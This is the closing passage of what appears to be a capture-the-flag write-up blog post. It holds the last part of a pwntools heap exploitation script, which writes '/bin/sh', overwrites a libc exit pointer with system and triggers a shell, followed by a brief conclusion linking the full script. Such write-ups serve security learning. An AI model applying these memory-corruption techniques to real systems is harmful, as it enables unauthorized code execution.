+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
+</span><span>    allocated_count_new2 </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xfb1
+</span><span>    </span><span style=color:#ffb454>do_work</span><span>(allocated_count_new2 </span><span style=color:#f29668>- </span><span>offset_new)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(target))
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span style=color:#f29668>*</span><span style=color:#f29718>8</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'/bin/sh</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span>)  </span><span style=font-style:italic;color:#5c6773>#Get allocation on libc bss and overwrite rdi pointer to /bin/sh
+</span><span>    </span><span style=color:#ffb454>do_work</span><span>(offset_new</span><span style=color:#f29668>+</span><span style=color:#f29718>3</span><span style=color:#f29668>+</span><span style=color:#f29718>4</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
+</span><span>    allocated_count_new3 </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x13d1
+</span><span>    </span><span style=color:#ffb454>do_work</span><span>(allocated_count_new3</span><span style=color:#f29668>-</span><span>(offset_new))
+</span><span>    exit_ptr </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x218f68
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(exit_ptr))
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(system))  </span><span style=font-style:italic;color:#5c6773>#Get allocation on exit pointer and overwrite it with system
+</span><span>    </span><span style=color:#ffb454>exit</span><span>()                  </span><span style=font-style:italic;color:#5c6773>#Finally call exit and trigger shell
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
+</span></code></pre><h2 id=conclusion>CONCLUSION</h2><p>It was a really nice challenge and I had a lot of fun solving it.<p>Here's the <a href=https://gist.github.com/PwnVerse/c7dc7f14dcc5cf8b044705c2037559f1>script</a></section></article></main></div>
